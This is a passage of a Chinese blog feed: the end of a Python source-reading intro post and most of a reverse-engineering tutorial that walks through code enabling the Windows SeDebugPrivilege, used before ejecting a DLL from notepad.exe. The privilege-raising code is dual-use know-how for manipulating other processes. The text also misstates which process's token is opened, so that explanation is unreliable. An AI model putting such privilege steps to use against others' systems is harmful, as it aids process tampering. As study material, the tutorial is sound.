        <content type="html"><![CDATA[<h3 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h3><p>一直想着锻炼自己阅读代码的能力。著名技术作家侯捷在《STL源码剖析》中说过：源码之前，了无秘密。</p><p>自己的实验室导师的研究方向以及实验室的研究内容是程序污点分析一类，对于源码阅读的技能是做出了一定的要求的。实际上在学习PE文件格式的时候，在诸多结构体中穿梭也是一种方法。于是开始查找这块内容，期间对陈儒老师写的《Python 源码剖析》感兴趣，偶然发现有dalao出过专栏，用的是python3.7.4的源码。<a href="https://www.python.org/downloads/release/python-374/">这里是下载页</a>。</p><p>看完前两节就觉得有所收获，有些期待后续章节，于是交学费了。看得出专栏dalao很是用心。于是想着做下学习该专栏的一些记录，鉴于自己的水平，目前我自己的该系列肯定不如专栏主人做的优秀，<strong>希望大家也多多支持专栏主</strong>，专栏链接在这里：<a href="http://www.imooc.com/read/76/article/1858">这里是链接</a>。</p><br><br><p>这部分也会记录自己阅读该专栏过程中的一些感慨以及一些杂项内容：</p><h3 id="思绪"><a href="#思绪" class="headerlink" title="思绪"></a>思绪</h3><ul><li><p>专栏开篇的故事引入很IT“江湖”的味道，很喜欢这种风格。合格的博客主一定是会讲故事的！建议看看，看完指不定和我一样知识付费了呢 :D</p><p>  <a href="http://www.imooc.com/read/76/article/1858">为什么要钻研源码？</a></p><p>  <a href="http://www.imooc.com/read/76/article/1859">小菜成长之路，当心成为API调用侠</a></p></li><li><p>学习 &amp; 研究</p><p>  感觉学习建立在他人研究与学习的基础上的，为理解这个过程为吸收知识，沉淀自己。而研究则是在学习的基础上通过量变的积累尝试触碰知识边界的壁垒，突破成功，称之为研究有自己的产出。</p><p>  ​——-2022&#x2F;4&#x2F;27</p></li><li><p><a href="https://docs.python.org/zh-cn/3.7/c-api/index.html">Python&#x2F;C API参考手册</a></p></li><li><p>源码阅读技巧个人建议向。源码中难免遇到不熟悉的部分，遇到这块不建议直接往下层钻，而是先观察函数名等浅层信息，试图理解，随后谷歌了解大致意思即可。即便要跟进，建议不超过两层，因为每进入一层可能有新的陌生东西出现</p><p>  ​——-2022&#x2F;4&#x2F;29</p></li></ul><h3 id="杂项内容"><a href="#杂项内容" class="headerlink" title="杂项内容"></a>杂项内容</h3><p>源码阅读我的环境时mac + sublime Text 3 + Ctags插件，具体配置网上许多教程，不一一列举，感兴趣的看<a href="https://tech.limuqiao.com/archives/16.html">这篇文章</a>，效果可以达到在项目中快速穿梭于定义与引用之类的功能：</p><img src="/2022/05/04/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%BC%80%E7%AF%87/1.png" class="">]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.9--Windows进程提权</title>
      <link href="/2022/05/04/%E9%80%86%E6%A0%B8No-9-Windows%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%83/"/>
      <url>/2022/05/04/%E9%80%86%E6%A0%B8No-9-Windows%E8%BF%9B%E7%A8%8B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h3><p>解决<a href="https://cvjark.github.io/2022/04/24/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-8-DLL%E5%8D%B8%E8%BD%BD/">上节</a>关于提升Windows权限的遗留问题，在上节内容卸载DLL中，利用了EjectDll.exe从notepad.exe的加载模块中进行指定模块的卸载。这个过程中涉及了跨内存操作，都知道Windows系统需要保证进程之间互不干扰，相互独立。在Windows下编程有些涉及到硬件或者跨内存的API会发现失效，这就需要在执行某些跨内存的操作前提升Windows的权限。</p><p>这部分的具体实例是EjectDll -&gt; SetPrivilege(SE_DEBUG_NAME, TRUE)，函数定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(),</span><br><span class="line">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class="line">              &amp;hToken) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">                              lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">                              &amp;luid) )        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>( bEnablePrivilege )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">AdjustTokenPrivileges</span>(hToken, </span><br><span class="line">                               FALSE, </span><br><span class="line">                               &amp;tp, </span><br><span class="line">                               <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                               (PTOKEN_PRIVILEGES) <span class="literal">NULL</span>, </span><br><span class="line">                               (PDWORD) <span class="literal">NULL</span>) )</span><br><span class="line">    &#123; </span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>() ); </span><br><span class="line">        <span class="keyword">return</span> FALSE; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SetPrivilege-gt-OpenProcessToken"><a href="#SetPrivilege-gt-OpenProcessToken" class="headerlink" title="SetPrivilege -&gt; OpenProcessToken"></a>SetPrivilege -&gt; OpenProcessToken</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">OpenProcessToken</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD   DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE TokenHandle</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="Access-token"><a href="#Access-token" class="headerlink" title="Access token"></a>Access token</h4><p>学习这个API之前有必要了解<a href="https://blog.csdn.net/dongpanshan/article/details/7873087">access token</a>：</p><blockquote><p>访问令牌是一个被保护的对象，包含了与用户帐户相关的辨识和特权信息。当用户登陆到一台windows计算机，登陆进程会验证用户的登陆凭据。成功后，登陆进程返回一个对应用户的SID和一个用户的安全组SID列表。计算机LSA使用这些信息创建一个访问令牌（主访问令牌）。该访问令牌包括了由登录进程返回的SIDs和一份由本地安全策略分发给用户以及用户安全组的特权列表。此后，这份访问令牌的拷贝会跟每个代表用户执行的线程和进程链接。</p><p>如果拿到访问令牌，登录成功，要是<strong>访问某台本域内计算机的共享资源时，则必须出示访问令牌。从而来决定将拥有何种权限来访问</strong>。</p></blockquote><p>因此在涉及跨进程内存的操作需要了解是否具备相应的权限，没有的话则需要先进行权限提升。</p><p>回到OpenProcessToken的分析</p><p>关于OpenProcessToken API的<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken">官方文档</a>中对于API的描述有这样的说法：The <strong>OpenProcessToken</strong> function opens the <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">access token</a> associated with a process.</p><p>因此OpenProcessToken 是用来返回具备权限（DesiredAccess）目标进程（notepad.exe）的访问令牌（access token）。</p><blockquote><p>第一个参数传递的是想要获取的access token对应的进程句柄。</p><p>第二个参数需要指出将对打开的access token期望得到的权限</p><p>第三个参数则是操作成功后返回的access token</p></blockquote><p>这里列举第二个参数可能的取值，<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects">来源</a>：</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left">TOKEN_ADJUST_DEFAULT</td><td align="left">Required to change the default owner, primary group, or DACL of an access token.</td></tr><tr><td align="left">TOKEN_ADJUST_GROUPS</td><td align="left">Required to adjust the attributes of the groups in an access token.</td></tr><tr><td align="left">TOKEN_ADJUST_PRIVILEGES</td><td align="left"><strong>Required to enable or disable the privileges in an access token.</strong></td></tr><tr><td align="left">TOKEN_ADJUST_SESSIONID</td><td align="left">Required to adjust the session ID of an access token. The SE_TCB_NAME privilege is required.</td></tr><tr><td align="left">TOKEN_ASSIGN_PRIMARY</td><td align="left">Required to attach a <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly"><em>primary token</em></a> to a <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly"><em>process</em></a>. The SE_ASSIGNPRIMARYTOKEN_NAME privilege is also required to accomplish this task.</td></tr><tr><td align="left">TOKEN_DUPLICATE</td><td align="left">Required to duplicate an access token.</td></tr><tr><td align="left">TOKEN_EXECUTE</td><td align="left">Same as STANDARD_RIGHTS_EXECUTE.</td></tr><tr><td align="left">TOKEN_IMPERSONATE</td><td align="left">Required to attach an impersonation access token to a process.</td></tr><tr><td align="left">TOKEN_QUERY</td><td align="left"><strong>Required to query an access token.</strong></td></tr><tr><td align="left">TOKEN_QUERY_SOURCE</td><td align="left">Required to query the source of an access token.</td></tr><tr><td align="left">TOKEN_READ</td><td align="left">Combines STANDARD_RIGHTS_READ and TOKEN_QUERY.</td></tr><tr><td align="left">TOKEN_WRITE</td><td align="left">Combines STANDARD_RIGHTS_WRITE, TOKEN_ADJUST_PRIVILEGES, TOKEN_ADJUST_GROUPS, and TOKEN_ADJUST_DEFAULT.</td></tr><tr><td align="left">TOKEN_ALL_ACCESS</td><td align="left">Combines all possible access rights for a token.</td></tr></tbody></table><p>源码中第二个参数被设置为：TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY。表明对于打开的access token我们需要能够访问access token并作启用或禁用access token的某些特权。</p><p>PS：需要具备TOKEN_ADJUST_PRIVILEGES权限的access token才有提升权限的能力</p><p><strong>如期执行的话将返回目标进程（notepad.exe）的access token（具备TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY的权限）</strong></p><h4 id="SetPrivilege-gt-LookupPrivilegeValue"><a href="#SetPrivilege-gt-LookupPrivilegeValue" class="headerlink" title="SetPrivilege -&gt; LookupPrivilegeValue"></a>SetPrivilege -&gt; LookupPrivilegeValue</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">LookupPrivilegeValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpSystemName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR lpName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PLUID  </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;<span class="comment">//返回LUID（系统中具备特权（lpName中描述）的LUID标识）</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea">官方文档</a>中有描述：The <strong>LookupPrivilegeValue</strong> function retrieves the <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/l-gly">locally unique identifier</a> (LUID) used on a specified system to locally represent the specified privilege name.指出该API用于取回用于描述指定系统所所具备权限的LUID结构，<strong>大致作用是查看系统上所允许的令牌权限</strong></p><p>第一个参数是一个以NULL结尾的字符串，指出想查看的系统。当第一个参数设置为NULL表明查询的是本地系统localhost</p><p>第二个参数指定特权名，马上提到</p><p>第三个参数用于接收指定权限的相关信息</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//特权名，来源：winnt.h</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//                                                                    //</span></span><br><span class="line"><span class="comment">//               NT Defined Privileges                                //</span></span><br><span class="line"><span class="comment">//                                                                    //</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_CREATE_TOKEN_NAME              TEXT(<span class="string">&quot;SeCreateTokenPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_ASSIGNPRIMARYTOKEN_NAME        TEXT(<span class="string">&quot;SeAssignPrimaryTokenPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_LOCK_MEMORY_NAME               TEXT(<span class="string">&quot;SeLockMemoryPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_INCREASE_QUOTA_NAME            TEXT(<span class="string">&quot;SeIncreaseQuotaPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_UNSOLICITED_INPUT_NAME         TEXT(<span class="string">&quot;SeUnsolicitedInputPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_MACHINE_ACCOUNT_NAME           TEXT(<span class="string">&quot;SeMachineAccountPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_TCB_NAME                       TEXT(<span class="string">&quot;SeTcbPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_SECURITY_NAME                  TEXT(<span class="string">&quot;SeSecurityPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_TAKE_OWNERSHIP_NAME            TEXT(<span class="string">&quot;SeTakeOwnershipPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_LOAD_DRIVER_NAME               TEXT(<span class="string">&quot;SeLoadDriverPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_SYSTEM_PROFILE_NAME            TEXT(<span class="string">&quot;SeSystemProfilePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_SYSTEMTIME_NAME                TEXT(<span class="string">&quot;SeSystemtimePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_PROF_SINGLE_PROCESS_NAME       TEXT(<span class="string">&quot;SeProfileSingleProcessPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_INC_BASE_PRIORITY_NAME         TEXT(<span class="string">&quot;SeIncreaseBasePriorityPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_CREATE_PAGEFILE_NAME           TEXT(<span class="string">&quot;SeCreatePagefilePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_CREATE_PERMANENT_NAME          TEXT(<span class="string">&quot;SeCreatePermanentPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_BACKUP_NAME                    TEXT(<span class="string">&quot;SeBackupPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_RESTORE_NAME                   TEXT(<span class="string">&quot;SeRestorePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_SHUTDOWN_NAME                  TEXT(<span class="string">&quot;SeShutdownPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_DEBUG_NAME                     TEXT(<span class="string">&quot;SeDebugPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_AUDIT_NAME                     TEXT(<span class="string">&quot;SeAuditPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_SYSTEM_ENVIRONMENT_NAME        TEXT(<span class="string">&quot;SeSystemEnvironmentPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_CHANGE_NOTIFY_NAME             TEXT(<span class="string">&quot;SeChangeNotifyPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_REMOTE_SHUTDOWN_NAME           TEXT(<span class="string">&quot;SeRemoteShutdownPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_UNDOCK_NAME                    TEXT(<span class="string">&quot;SeUndockPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_SYNC_AGENT_NAME                TEXT(<span class="string">&quot;SeSyncAgentPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_ENABLE_DELEGATION_NAME         TEXT(<span class="string">&quot;SeEnableDelegationPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_MANAGE_VOLUME_NAME             TEXT(<span class="string">&quot;SeManageVolumePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_IMPERSONATE_NAME               TEXT(<span class="string">&quot;SeImpersonatePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_CREATE_GLOBAL_NAME             TEXT(<span class="string">&quot;SeCreateGlobalPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_TRUSTED_CREDMAN_ACCESS_NAME    TEXT(<span class="string">&quot;SeTrustedCredManAccessPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_RELABEL_NAME                   TEXT(<span class="string">&quot;SeRelabelPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_INC_WORKING_SET_NAME           TEXT(<span class="string">&quot;SeIncreaseWorkingSetPrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_TIME_ZONE_NAME                 TEXT(<span class="string">&quot;SeTimeZonePrivilege&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SE_CREATE_SYMBOLIC_LINK_NAME      TEXT(<span class="string">&quot;SeCreateSymbolicLinkPrivilege&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>例子中传给SetPrivilege -&gt; LookupPrivilegeValue的参数是<code>LookupPrivilegeValue(NULL,,lpszPrivilege,&amp;luid) )</code>其中第二个参数是传递进来的 <strong>SE_DEBUG_NAME</strong>。所以完成的是查看当前系统是否具备SE_DEBUG_NAME的权限。LookupPrivilegeValue成功查询到，则返回非0值，并且保存 LUID在变量luid中，否则返回0，说明不具备相应权限。</p><p>关于权限SE_DEBUG_NAME：</p><blockquote><p>If the debugging process has the <strong>SE_DEBUG_NAME</strong> privilege granted and enabled, it can debug any process.</p><p>当<strong>具备</strong>权限SE_DEBUG_NAME并且处于<strong>enabled</strong>状态，则能够调试任何进程</p></blockquote><h4 id="结构体TOKEN-PRIVILEGES"><a href="#结构体TOKEN-PRIVILEGES" class="headerlink" title="结构体TOKEN_PRIVILEGES"></a>结构体TOKEN_PRIVILEGES</h4><p>这里需要补充的是一个结构体：TOKEN_PRIVILEGES</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TOKEN_PRIVILEGES</span> &#123;</span><br><span class="line">  DWORD               PrivilegeCount;</span><br><span class="line">  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];</span><br><span class="line">&#125; TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_privileges">官方描述</a>中给出：The <strong>TOKEN_PRIVILEGES</strong> structure contains information about a set of privileges for an <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">access token</a>.大致是说结构体TOKEN_PRIVILEGES包含给定的access token所具备的权限信息</p><p>第一个成员PrivilegeCount，标识access token所具备的权限条目数量，是必须要有的</p><p>第二个成员是指向结构体<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-luid_and_attributes">LUID_AND_ATTRIBUTES</a> 的数组，每一个数组成员包含<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-luid">LUID</a> 以及特权的属性</p></blockquote><p>LUID_AND_ATTRIBUTES结构体</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LUID_AND_ATTRIBUTES</span> &#123;</span><br><span class="line">  LUID  Luid;</span><br><span class="line">  DWORD Attributes;</span><br><span class="line">&#125; LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES;</span><br></pre></td></tr></table></figure><p>特权属性</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>SE_PRIVILEGE_ENABLED</strong></td><td align="left">The privilege is enabled.</td></tr><tr><td align="left"><strong>SE_PRIVILEGE_ENABLED_BY_DEFAULT</strong></td><td align="left">The privilege is enabled by default.</td></tr><tr><td align="left"><strong>SE_PRIVILEGE_REMOVED</strong></td><td align="left">Used to remove a privilege. For details, see <a href="https://docs.microsoft.com/en-us/windows/desktop/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">AdjustTokenPrivileges</a>.</td></tr><tr><td align="left"><strong>SE_PRIVILEGE_USED_FOR_ACCESS</strong></td><td align="left">The privilege was used to gain access to an object or service. This flag is used to identify the relevant privileges in a set passed by a client application that may contain unnecessary privileges.</td></tr></tbody></table><p>接着分析</p><p>后续对声明的结构体<code>TOKEN_PRIVILEGES tp</code>赋值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tp.Privileges[<span class="number">0</span>].Luid = luid;<span class="comment">//这里luid是LookupPrivilegeValue查询具备权限SE_DEBUG_NAME权限的LUID</span></span><br></pre></td></tr></table></figure><p>随后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="literal">true</span> )</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>完成的将luid中具备的SE_DEBUG_NAME的权限打开（enable）</p><h4 id="SetPrivilege-gt-AdjustTokenPrivileges"><a href="#SetPrivilege-gt-AdjustTokenPrivileges" class="headerlink" title="SetPrivilege -&gt; AdjustTokenPrivileges"></a>SetPrivilege -&gt; AdjustTokenPrivileges</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">AdjustTokenPrivileges</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE            TokenHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            BOOL              DisableAllPrivileges,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PTOKEN_PRIVILEGES NewState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD             BufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PTOKEN_PRIVILEGES PreviousState,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PDWORD            ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges">官方描述</a>：The <strong>AdjustTokenPrivileges</strong> function enables or disables privileges in the specified <a href="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/a-gly">access token</a>. Enabling or disabling privileges in an access token requires TOKEN_ADJUST_PRIVILEGES access.</p><p>用于激活或禁止access token的相关特权，禁止或激活特权需要access token具备TOKEN_ADJUST_PRIVILEGES特权</p><p>第一个参数指向即将要修改的access token，这里是由前面OpenProcessToken中返回的access token并且是具备TOKEN_ADJUST_PRIVILEGES权限的</p><p>第二个参数用于指示是否关闭access token的全部权限，显然这里与我们目的相悖，因此为false</p><p>第三个参数的指针指向结构体TOKEN_PRIVILEGES，当第二个参数设置为false则AdjustTokenPrivileges根据这个结构体的内容关闭或禁止其中设置的权限，可以取值：SE_PRIVILEGE_ENABLED 或者 SE_PRIVILEGE_REMOVED 或者NONE（关闭），总的来说就是新特权的指针</p><p>第四个参数为字节为单位的PTOKEN_PRIVILEGES NewStateS所占的大小，如果NewState为空，该参数应为NULL</p><p>第五个参数也是一个指向 TOKEN_PRIVILEGES结构的指针，存放修改前的访问权限的信息，可空；</p><p>最后一个参数为实际PreviousState结构返回的大小，可空</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tp, <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class="line">                      (PTOKEN_PRIVILEGES) 